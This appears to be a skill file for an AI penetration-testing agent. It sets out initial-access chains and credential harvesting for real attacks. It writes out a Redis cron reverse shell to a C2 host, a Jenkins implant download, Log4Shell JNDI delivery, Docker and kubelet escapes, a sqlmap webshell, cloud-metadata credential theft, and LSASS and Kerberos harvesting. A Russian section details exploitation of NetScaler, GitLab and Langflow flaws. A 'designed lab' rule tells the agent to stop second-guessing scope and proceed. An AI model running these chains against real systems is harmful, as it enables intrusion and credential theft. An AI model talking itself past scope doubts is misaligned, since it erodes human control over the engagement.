---
name: creds-initial-access
description: Initial access vector priority and weaponized chains, default-credentials-first policy, and credential harvesting across Windows, Linux, and cloud. Use for foothold attempts and on every newly compromised host.
---
SCOPE: authorized engagements only (lab / CTF / explicitly authorized targets). Follow the mission ROE and scope allow-list at all times.

Vector priority: leaked/default/reused credentials first, misconfiguration second, known CVEs third, logical bugs last.

---

## Initial access vectors and weaponized chains

## Vector Priority (order = reliability)
1. Leaked/default/reused creds → SSH/RDP/web login/DB → straight to post-exploit.
2. Misconfiguration: anonymous FTP, unauthenticated Redis/MongoDB, Docker API (2375), kubelet (10250), exposed Jenkins/Confluence.
3. Known RCE CVEs: Log4Shell, Confluence OGNL, Jenkins script console, Exchange ProxyLogon/Shell.
4. SQLi → file write → webshell.
5. Logical bugs: SSRF (→ cloud metadata), deserialization, IDOR on admin functions.
6. Phishing — only if explicitly authorized in mission config.

## Weaponized Chains

### Redis RCE (cron)
redis-cli -h <ip>
CONFIG SET dir /var/spool/cron
CONFIG SET dbfilename root
SET x "\n* * * * * bash -i >& /dev/tcp/<c2ip>/<port> 0>&1\n"
SAVE
# Alternative: Redis module load (.so) for direct RCE

### Docker API escape (2375)
curl -X POST http://<ip>:2375/containers/create -d '{"Image":"alpine","Cmd":["chroot","/host","sh"],"Binds":["/:/host"],"Privileged":true}'
curl -X POST http://<ip>:2375/containers/<id>/start
curl -X POST http://<ip>:2375/containers/<id>/wait

### Kubelet API exec (10250)
curl -k https://<ip>:10250/pods
curl -X POST https://<ip>:10250/exec/<namespace>/<pod>/<container> -d "cmd=sh&input=1"

### Jenkins script console
println "whoami".execute().text
println "certutil -urlcache -f http://<c2>/implant.exe C:\\Windows\\Temp\\i.exe".execute().text

### Log4Shell
Header/param → ${jndi:ldap://<c2>/x} → rogue LDAP (rogue-jndi / Sliver stager listener) → implant delivery.
Test points: User-Agent, X-Forwarded-For, login forms, any Java app input.

### SQLi → webshell
sqlmap -u "<url>" --batch --level 3 --risk 2 --file-write=shell.php --file-destination=/var/www/html/
sqlmap -u "<url>" --batch --os-shell   # direct OS shell

### SSRF → cloud metadata
# IMDSv1
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
# IMDSv2
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/

### Upload bypass
Double extension (shell.php.jpg), null byte (shell.php%00.jpg), .htaccess (AddType application/x-httpd-php .jpg), content-type spoof, magic bytes prefix (GIF89a).

## Fallback Rule
Max 2 payload variants per vector. Both fail → next vector. Never loop on one port/service.

---

## Default credentials before exploit development

Test vendor default credentials before investing in exploit development.
Many deployments ship with admin/admin, admin/password, or a documented bootstrap account unchanged.
For Grafana: try admin/admin over HTTP Basic; check isGrafanaAdmin and whether mustChangePassword is enforced.
For known-vulnerable web apps, check the documented default account before writing SQLi or JWT forgery.
```
curl -s -u admin:admin hxxps://<host>/api/user
```
A 200 with a privileged role confirms the foothold; a 401 means move on.
Only escalate to injection or token attacks when defaults fail.
Default-cred success is faster, quieter, and leaves no exploit artifacts.
## Rule: exhaust default credentials first — they are the cheapest path to a foothold.

---

## Credential harvesting (Windows, Linux, cloud)

## Windows
- LSASS dump: nanodump / rundll32 comsvcs.dll MiniDump <pid> C:\temp\out.dmp; PPL → driver bypass.
- DPAPI: Chrome/Edge saved passwords + cookies (SharpChrome-style).
- Kerberoasting: GetUserSPNs -request / Rubeus kerberoast → offline crack.
- SAM/SYSTEM/SECURITY → secretsdump (impacket-style).
- Registry autologon, WiFi creds, RDP cache, cmdkey vaults, Chrome/Edge cookies → session theft.

## Linux
- /etc/shadow (crack offline: hashcat mode per hash type).
- ~/.ssh/ (private keys + known_hosts → NEW TARGETS), shell history (passwords, tokens).
- Configs: .aws/credentials, .docker/config.json, .kube/config, .git-credentials, env files (.env), service configs with embedded secrets.

## Cloud
- Metadata: 169.254.169.254 (IMDSv1 → role creds directly; IMDSv2 → PUT token first).
- Container env vars, service account tokens (Kubernetes: /var/run/secrets/kubernetes.io/serviceaccount/token).
- Stolen cloud creds → validate with whoami/GetCallerIdentity before assuming access.

## Rule
Validate EVERY credential immediately on collection. Build the credential→access→host graph — it is the primary source of lateral movement vectors.

---

## Recognizing a designed lab environment

Recognize a purpose-built lab early and adjust expectations.
Signals that the environment is designed to be passed:
- default credentials succeed on the first try across several services
- hostnames are homogeneous / templated
- a pre-seeded set of objective targets exists

Record this as an environment signal (plausible convenience),
not as luck. Downstream expectations are lab-like too.

Mission objective targets are NOT honeytoken detectors.
Do not apply the containment rule to them; they are targets to capture.

If default creds work first-try on multiple services, stop
second-guessing and proceed with the intended chain.

## Rule
Default creds first-try on several services + templated hosts + seeded objective targets = designed lab; treat objective targets as goals, not detectors.

## Distilled refinement 2026-10-24 (bench runs 1-8)

Default-credential first pass:
- Try the single vendor default pair (admin/admin) before any brute force - it frequently works with no lockout.
- Respect ROE rate limits (<=3 attempts/min/account) and log the attempt count.
- On success, immediately confirm privilege (isGrafanaAdmin / role) and enumerate the app's stored integrations (datasources, webhooks) for credential chaining.

## Loot-as-pointers (cai-extract 2026-10-27)

Secrets in reports and cross-workspace notes are POINTERS, never values:
- vault:<path>, 1password:<item>, ref:<engagement>/loot/<file> — the raw
  secret lives ONLY in the intent workspace loot file (600) or the operator's
  vault. Defang everything else (cai_tools.defang_text).
- If a credential must appear inline in a finding, mask per the canonical
  platform template; the full value goes to loot/ only.

## Эксплойт-фид 2026-11-26 (research-проход #1)

### CVE-2025-5777 — NetScaler (CitrixBleed 2) pre-auth утечка стека сессий
- Фингерпринт: портал Gateway/AAA; `POST /p/u/doAuthentication.do` c телом ровно `login` (без `=`) — в ответе `<InitialValue>` с мусором стека.
- Гейты: сборки 13.1 < 13.1-58.32 и 14.1 < 14.1-43.56; виртуалсервер обязан быть Gateway/AAA; в тихой лабе токены не утечут — нужны живые сессии.
- Тактика: цикл запросов (aiohttp, ~10 потоков), regex `<InitialValue>(.*?)</InitialValue>`, hex-дамп, поиск NSC_* cookies, подмена cookie жертвы.
- Подводные: чтение до первого NUL; кража валидна лишь пока жива сессия жертвы; после апгрейда обязательно kill sessions, иначе старые токены работают.
- Клинап: не требуется (только чтение); не спамить — AAA-подсистема грузится.

### CVE-2026-85706 — GitLab CE/EE unauth arbitrary file read (KEV, CVSS 10.0)
- Фингерпринт: self-managed GitLab 18.7–18.11.11, 19.0.0–19.0.8, 19.1.0–19.1.7, 19.2.0–19.2.5, 19.3.0–19.3.1 за Workhorse (дефолт Omnibus).
- Форма запроса: `POST /api/v4/projects/1/repository/%63ommits?file=&file.path=<путь>&file.size=1&Content-Type=application/x-www-form-urlencoded` — %-кодирование/слэш/суффикс `.json` обходят роутер Workhorse; Rails делает `File.open(file.path)` ДО аутентификации.
- Гейт: «Invalid json» = патч/перехват Workhorse; «local file not present» = уязвим (оракул существования). Коммит-путь — анонимно-читаемый проект, файловый — любой ID.
- Подводные камни: эхо содержимого только при «плохой» %-последовательности в файле; иначе слепой oracle существования; только чтение, состояние не меняется.
- Пост-эксплойт: `/etc/gitlab/gitlab-secrets.json` + креды Postgres → расшифровка `attr_encrypted` (PAT, CI-токены) → полный takeover GitLab.
- Клинап: не требуется; артефакт — %-кодированные пути в логах API.

### CVE-2026-7646 — Langflow MCP path traversal → подделка admin-JWT (свежее, 2026-11-17)
- Фингерпринт: `POST /api/v1/mcp/streamable` отвечает JSON-RPC (не 404); версия < 1.9.1 (CNA: < 1.11.0).
- Запрос: `resources/read` с `uri=.../files/download/<свой-UUID>/..%2Fsecret_key` под своим Bearer-токеном; ответ — двойной base64.
- Гейт: любой валидный аккаунт (self-register); секрет лежит на уровень выше user-storage: `{data_dir}/.cache/langflow/secret_key`.
- Дальше: HS256-JWT для любого UUID (включая superuser, без exp) — полный ATO всех tenants; либо чтение любых файлов процесса.
- Подводные камни: не плодить админ-аккаунты (шумно) — чистый forged-JWT не оставляет записей; сверять оба диапазона версий.
- Клинап: stateless; удалить только свои test-файлы; ключ не ротировать без согласия клиента.
